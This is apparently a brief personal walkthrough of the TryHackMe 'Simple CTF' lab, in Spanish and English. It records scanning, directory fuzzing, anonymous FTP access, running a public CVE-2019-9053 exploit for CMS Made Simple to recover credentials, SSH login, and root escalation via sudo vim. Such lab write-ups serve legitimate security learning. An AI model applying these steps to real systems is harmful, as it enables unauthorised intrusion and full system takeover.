# Simple CTF 
- THM
- 10.128.169.184
- nmap -sCV -Pn 10.128.169.184
- 21,80,2222 ssh -> 7.2 enumeartionuser!!
- ftp-anon: Anonymous FTP login allowed (FTP code 230)
- ffuf -u http://10.128.169.184/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
- /simple/
- probamos de mientras a ver que hay en el servicio ftp -> passive para quitarlo -> ls -> get ForMitch.txt
- You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
- http://10.128.169.184/simple/
- ❯ ffuf -u http://10.128.169.184/simple/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
- modules, uploads,doc, admin, lib,tmp
- CMS Made Simple version 2.2.8
- /admin/ vemos un panel de login. -> http://10.128.169.184/simple/admin/login.php
- searchsploit CMS Made Simple no encuentro versión específica busco por google.
- https://github.com/Perseus99999/CVE-2019-9053-working-/tree/main
- python3 46635.py -u http://192.168.173.148/simple/ -w /usr/share/wordlists/rockyou.txt

-> salt = 1dac0d92e9fa6bb2
username = mitch
email = admin@admin.com
password = secret

- ssh -p 2222 mitch@10.128.169.184 entramos
- (root) NOPASSWD: /usr/bin/vim -> sudo -l
- sudo /usr/bin/vim -> :!/bin/bash -> enter -> root :)
